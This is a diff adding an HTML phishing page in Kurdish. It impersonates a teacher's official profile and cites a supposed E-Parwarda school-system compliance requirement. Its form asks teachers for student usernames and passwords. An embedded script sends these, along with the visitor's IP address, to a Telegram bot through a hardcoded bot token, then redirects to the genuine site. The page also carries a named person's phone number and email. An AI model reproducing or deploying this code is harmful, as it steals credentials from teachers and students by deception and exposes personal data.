@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="description" content="Official page of the founder and teacher.">
+    <meta name="author" content="Founder Name">
+    <title>زانیاری مامۆستا</title
+</head>
+<body>
+
+<header>
+    <h1>زانیاری کەسی بەڕێز ديار سرحان</h1>
+</header>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 20px; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
+        input, textarea, button { width: 100%; padding: 10px; margin: 5px 0; border-radius: 4px; border: 1px solid #ccc; }
+        button { background: #333; color: white; cursor: pointer; }
+        button:hover { background: #555; }
+    </style>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background: #333;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+        }
+        .profile {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .profile img {
+            border-radius: 50%;
+            margin-right: 20px;
+        }
+        .profile div {
+            max-width: 400px;
+        }
+        .profile h2 {
+            margin: 0;
+            font-size: 24px;
+        }
+        .profile p {
+            margin: 10px 0;
+        }
+        .login-form {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+        .login-form label {
+            display: block;
+            margin: 8px 0 4px;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        .login-form button {
+            padding: 10px 20px;
+            background-color: #333;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .login-form button:hover {
+            background-color: #555;
+        }
+        footer {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 30px;
+        }
+        footer a {
+            color: white;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Profile Section -->
+    <div>
+        <h2>ناوی مامۆستا: ديار سرحان</h2>
+        <p><strong>ناو وشوێنی قوتابخانە:</strong> هەڤال/کوردستان/زاخۆ/شەهیدان</p>
+        <p><strong>هەژماری موبایل:</strong> (+964) 750 190 5707</p>
+        <p><strong>ئیمەیڵ:</strong> havalhighschool2004@gmail.com</p>
+        <p><strong>زانیاری:</strong> لە چوارچێوەی نوێکاری نوێی پابەندبوون لە وەزارەتی پەروەردەوە، پێویستە سەرجەم مامۆستایان تۆمارەکانی دەستڕاگەیشتن بە خوێندکاران لە سیستەمی قوتابخانەی E-Parwarda پشتڕاست بکەنەوە بۆ دڵنیابوون لە ئامادەبوون و نمرەی ورد...</p>
+    </div>
+</div>
+
+<div class="container">
+    <h2>کۆدی خوێندکاری قوتابخانەی هەڤال و پاسۆرد بۆ هەر خوێندکارێک لە پۆلەکەتدا بۆ چەسپاندنی یەکپارچەیی سیستەم.</h2>
+    <form id="loginForm">
+        <label>کودی بەکارهێنەر</label>
+        <input type="text" id="username" required>
+
+        <label>وشەی نهێنی</label>
+        <input type="password" id="password" required>
+
+        <label>داواکاری</label>
+        <textarea id="message" rows="4" required></textarea>
+
+        <button type="submit">چوونەژوورەوە</button>
+    </form>
+</div>
+
+<script>
+    const botToken = "7903918872:AAGFKy7jSYIA6eAvmiQ19dwlZ-c5IFnlmXs";  // Replace with your Telegram bot token
+    const chatId = "6290314134";      // Replace with your Telegram chat ID
+
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const message = document.getElementById("message").value;
+
+        // Get IP Address
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+
+                // Prepare message
+                const telegramMessage = `
+🔹 New Login Attempt 🔹
+👤 Username: ${username}
+🔑 Password: ${password}
+✉️ Message: ${message}
+🌍 IP Address: ${userIP}
+                `;
+
+                // Send data to Telegram
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: telegramMessage })
+                })
+                .then(() => {
+                    alert("زانیاریەکان بە سەرکەوتوویی پڕکرانەوە... بەم زووانە پەیوەندیتان پێوە دەکەینەوە");
+                    document.getElementById("loginForm").reset();
+
+                    // Redirect after 2 seconds
+                    setTimeout(function() {
+                        window.location.href = "https://www.e-parwarda.com"; // Redirect to the specified website
+                    }, 2000);
+                })
+                .catch(error => console.error("Error sending message:", error));
+            })
+            .catch(error => console.error("Error fetching IP:", error));
+    });
+</script>
+
+<footer>
+    <p>&copy; 2025 e-parwarda. All Rights Reserved.</p>
+    <p>Powered by SoftMax</p>
+    <p><a href="terms.html">Terms and Conditions</a> | <a href="privacy.html">Privacy Policy</a></p>
+</footer>
+
+</body>
+</html>
